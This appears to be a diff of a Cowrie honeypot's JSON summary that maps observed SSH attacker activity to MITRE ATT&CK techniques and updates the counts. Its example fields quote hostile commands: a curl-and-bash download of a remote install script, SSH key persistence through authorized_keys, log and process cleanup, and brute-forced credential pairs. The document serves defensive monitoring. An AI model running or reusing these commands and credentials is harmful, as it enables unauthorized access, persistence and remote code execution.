@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-20 14:00:08",
+  "generated": "2026-09-20 15:01:12",
   "totals": {
-    "commands": 1099,
-    "login_failed": 3573,
-    "login_success": 228,
-    "sessions": 3891
+    "commands": 1135,
+    "login_failed": 3613,
+    "login_success": 234,
+    "sessions": 3948
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3573,
+      "count": 3613,
       "examples": [
         "zhy / zhy",
         "vivek / 123123",
@@ -21,14 +21,14 @@
         "admin / 28081979"
       ],
       "first": "2026-09-20T00:00:25.589298Z",
-      "last": "2026-09-20T13:59:58.083334Z",
-      "unique_ips": 90
+      "last": "2026-09-20T15:00:58.971301Z",
+      "unique_ips": 98
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 228,
+      "count": 234,
       "examples": [
         "root / LeitboGi0ro",
         "lghkel\\x09 / zpz}ld\\x09",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-09-20T01:13:40.450590Z",
-      "last": "2026-09-20T13:45:02.060156Z",
-      "unique_ips": 70
+      "last": "2026-09-20T14:58:56.261156Z",
+      "unique_ips": 76
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 198,
+      "count": 200,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "cat /proc/cpuinfo | grep name | wc -l",
@@ -53,8 +53,8 @@
         "uname -m"
       ],
       "first": "2026-09-20T01:13:47.893205Z",
-      "last": "2026-09-20T13:45:14.394937Z",
-      "unique_ips": 34
+      "last": "2026-09-20T14:58:56.518442Z",
+      "unique_ips": 35
     },
     {
       "id": "T1083",
@@ -76,7 +76,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 104,
+      "count": 120,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -85,14 +85,14 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:13:43.828905Z",
-      "last": "2026-09-20T13:32:09.385793Z",
-      "unique_ips": 37
+      "last": "2026-09-20T14:58:56.518442Z",
+      "unique_ips": 39
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 65,
+      "count": 68,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -101,14 +101,14 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:13:44.786465Z",
-      "last": "2026-09-20T13:32:09.630764Z",
-      "unique_ips": 31
+      "last": "2026-09-20T14:54:26.788029Z",
+      "unique_ips": 32
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 48,
+      "count": 50,
       "examples": [
         "w",
         "whoami",
@@ -117,8 +117,8 @@
         "id"
       ],
       "first": "2026-09-20T01:33:34.606580Z",
-      "last": "2026-09-20T13:32:28.376559Z",
-      "unique_ips": 28
+      "last": "2026-09-20T14:58:56.518442Z",
+      "unique_ips": 30
     },
     {
       "id": "T1057",
@@ -152,15 +152,15 @@
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 16,
+      "count": 17,
       "examples": [
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-20T01:33:32.387680Z",
-      "last": "2026-09-20T12:08:53.906510Z",
-      "unique_ips": 13
+      "last": "2026-09-20T14:58:56.518442Z",
+      "unique_ips": 14
     },
     {
       "id": "T1489",
@@ -180,14 +180,14 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 3,
+      "count": 4,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-20T01:13:47.893205Z",
-      "last": "2026-09-20T12:08:53.906510Z",
-      "unique_ips": 3
+      "last": "2026-09-20T14:58:56.518442Z",
+      "unique_ips": 4
     },
     {
       "id": "T1087.001",
@@ -241,11 +241,11 @@
   "unmapped": [
     [
       "sh",
-      138
+      139
     ],
     [
       "system",
-      134
+      135
     ],
     [
       "zalee",
@@ -261,19 +261,19 @@
     ],
     [
       "shell",
-      18
+      19
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      16
     ],
     [
       "/bin/busybox",
       15
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      8
-    ],
-    [
       "enable",
-      7
+      8
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -281,22 +281,26 @@
     ],
     [
       "echo SHELL_TEST",
-      5
+      6
     ],
     [
       "/bin/busybox TEST",
-      5
+      6
     ],
     [
       "cat /proc",
-      5
+      6
     ],
     [
       "./",
-      5
+      6
     ],
     [
       "echo WRITABLE >/tmp/.testfile 2>&1",
+      5
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       5
     ],
     [
@@ -312,12 +316,8 @@
       4
     ],
     [
-      "cd /proc && cat self/cmdline",
-      4
-    ],
-    [
       "linuxshell",
-      3
+      4
     ]
   ]
 }
